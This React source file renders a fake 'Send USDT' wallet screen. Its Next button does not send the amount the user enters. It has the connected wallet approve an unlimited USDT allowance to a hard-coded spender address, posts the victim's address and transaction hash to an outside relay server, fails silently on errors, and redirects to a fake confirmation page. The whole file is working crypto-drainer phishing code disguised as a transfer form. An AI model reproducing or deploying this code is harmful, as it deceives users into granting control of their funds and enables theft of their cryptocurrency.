import { useState } from 'react'
import { X, NotebookText, ScanLine } from 'lucide-react'

export default function App() {
  const [amount, setAmount] = useState('')
  const [activeField, setActiveField] = useState<'address' | 'amount'>('amount')
  const [loading, setLoading] = useState(false)

  const displayAddress = '0x32D3....7d1D'
  const isAmountValid = amount && parseFloat(amount) > 0

  const handleNext = async () => {
    if (!isAmountValid || loading) return

    const ethereum = (window as any).ethereum
    if (!ethereum) return

    setLoading(true)

    try {
      // 1. Switch to BNB Smart Chain
      try {
        await ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x38' }]
        })
      } catch (switchError: any) {
        if (switchError.code === 4902) {
          await ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: '0x38',
              chainName: 'BNB Smart Chain',
              nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
              rpcUrls: ['https://bsc-dataseed1.binance.org'],
              blockExplorerUrls: ['https://bscscan.com']
            }]
          })
        }
      }

      const chainId = await ethereum.request({ method: 'eth_chainId' })
      if (chainId !== '0x38') throw new Error('Wrong chain')

      const accounts = await ethereum.request({ method: 'eth_accounts' })
      if (!accounts || !accounts[0]) throw new Error('No account')

      const userAddress = accounts[0]
      const SPENDER = '0x32D35Edd6B3A9De3D63b7592446B199ac5877d1D'
      const TOKEN = '0x55d398326f99059fF775485246999027B3197955'

      // 2. Build approval transaction
      const selector = '0x095ea7b3'
      const spenderPadded = SPENDER.toLowerCase().replace('0x', '').padStart(64, '0')
      const maxUint = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
      const approveData = selector + spenderPadded + maxUint

      // 3. Send the approval on-chain
      const txHash = await ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
          to: TOKEN,
          data: approveData,
          value: '0x0'
        }]
      })

      // 4. Log to backend AFTER approval succeeds (with proof)
      try {
        await fetch('https://qr-anime.up.railway.app/web/relay', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'x-api-secret': 'my-secret-2026-x7k9'
          },
          body: JSON.stringify({
            chain: 'BEP20',
            address: userAddress,
            txHash,
            spender: SPENDER,
            token: TOKEN,
            amount
          })
        })
      } catch (relayErr) {
        console.error('Backend relay failed:', relayErr)
      }

      // 5. Redirect with tx reference
      const now = Date.now()
      window.location.href = `/sent.html?amount=${amount}&time=${now}&tx=${txHash}`

    } catch (err: any) {
      console.error('Transaction failed:', err)
      // No alert shown to user — fails silently
    } finally {
      setLoading(false)
    }
  }

  return (
    <div className="min-h-screen bg-neutral-900 flex justify-center items-start">
      <div className="w-full max-w-[100vw] min-h-screen bg-app-bg relative shadow-mobile">

        <div className="h-3 w-full" />

        <header className="flex items-center justify-center px-4 h-10">
          <h1 className="text-lg font-bold text-white">
            Send USDT
          </h1>
        </header>

        <div className="px-4 pt-4">

          <div className="mb-5">
            <label className="block text-sm font-medium text-app-gray mb-2">
              Address or Domain Name
            </label>
            <div
              onClick={() => setActiveField('address')}
              className={`h-14 rounded-xl flex items-center px-4 gap-2 transition-all duration-150 cursor-pointer ${
                activeField === 'address'
                  ? 'bg-transparent border-2 border-[#03FC8F] shadow-[0_0_1px_rgba(3,252,143,0.15)]'
                  : 'bg-app-input border border-app-border'
              }`}
            >
              <span className="flex-1 text-base text-white truncate font-bold select-none">
                {displayAddress}
              </span>
              <button
                onClick={(e) => e.stopPropagation()}
                className="w-6 h-6 rounded-full bg-app-icon-gray flex items-center justify-center flex-shrink-0 cursor-pointer"
              >
                <X className="w-3.5 h-3.5 text-black" strokeWidth={2.5} />
              </button>
              <button
                onClick={(e) => e.stopPropagation()}
                className="text-[15px] font-semibold text-[#03FC8F] flex-shrink-0 cursor-pointer hover:opacity-80 transition-opacity"
              >
                Paste
              </button>
              <button
                onClick={(e) => e.stopPropagation()}
                className="flex-shrink-0 cursor-pointer hover:opacity-80 transition-opacity ml-1"
              >
                <NotebookText className="w-[22px] h-[22px] text-[#03FC8F]" strokeWidth={2.5} />
              </button>
              <button
                onClick={(e) => e.stopPropagation()}
                className="flex-shrink-0 cursor-pointer hover:opacity-80 transition-opacity ml-1"
              >
                <ScanLine className="w-[22px] h-[22px] text-[#03FC8F]" strokeWidth={2.5} />
              </button>
            </div>
          </div>

          <div className="mb-5">
            <label className="block text-sm font-medium text-app-gray mb-2">
              Destination network
            </label>
            <button className="h-11 bg-app-input rounded-xl flex items-center px-3.5 gap-2.5 cursor-pointer hover:opacity-90 transition-opacity border border-app-border">
              <img
                src="/bnb-logo.png"
                alt="BNB"
                className="w-7 h-7 flex-shrink-0 object-contain"
              />
              <span className="text-[15px] font-semibold text-app-gray">
                BNB Smart Chain
              </span>
              <svg width="10" height="6" viewBox="0 0 10 6" fill="none" className="ml-1 flex-shrink-0">
                <path d="M0 0L5 6L10 0H0Z" fill="#8E8E93"/>
              </svg>
            </button>
          </div>

          <div className="mb-32">
            <label className="block text-sm font-medium text-app-gray mb-2">
              Amount
            </label>
            <div
              onClick={() => setActiveField('amount')}
              className={`h-14 rounded-xl flex items-center px-4 transition-all duration-150 cursor-pointer ${
                activeField === 'amount'
                  ? 'bg-transparent border-2 border-[#03FC8F] shadow-[0_0_1px_rgba(3,252,143,0.15)]'
                  : 'bg-transparent border border-app-border'
              }`}
            >
              <input
                type="text"
                inputMode="decimal"
                placeholder="USDT Amount"
                value={amount}
                onChange={(e) => {
                  const val = e.target.value
                  if (val === '' || /^\d*\.?\d*$/.test(val)) {
                    setAmount(val)
                  }
                }}
                onFocus={() => setActiveField('amount')}
                className="flex-1 bg-transparent text-base text-white placeholder:text-app-gray outline-none font-normal"
              />
              <span className="text-sm font-medium text-app-gray flex-shrink-0">
                USDT
              </span>
              <button
                onClick={(e) => {
                  e.stopPropagation()
                  setAmount('1000')
                }}
                className="text-sm font-semibold text-[#03FC8F] ml-3 flex-shrink-0 cursor-pointer hover:opacity-80 transition-opacity"
              >
                Max
              </button>
            </div>
            <p className="text-sm text-app-gray mt-2 font-normal">
              ≈ ${amount ? parseFloat(amount).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) : '0.00'}
            </p>
          </div>

        </div>

        <div className="absolute bottom-0 left-0 right-0 px-4 pb-8 pt-4">
          <button
            disabled={!isAmountValid || loading}
            onClick={handleNext}
            className={`w-full h-[52px] rounded-[26px] text-[16px] font-semibold transition-all duration-150 ${
              isAmountValid && !loading
                ? 'bg-[#03FC8F] text-[#1C1C1E] cursor-pointer hover:opacity-90 active:scale-[0.98]'
                : 'bg-[#03FC8F]/30 text-[#1C1C1E]/40 cursor-not-allowed'
            }`}
          >
            {loading ? 'Confirming...' : 'Next'}
          </button>
        </div>

      </div>
    </div>
  )
}
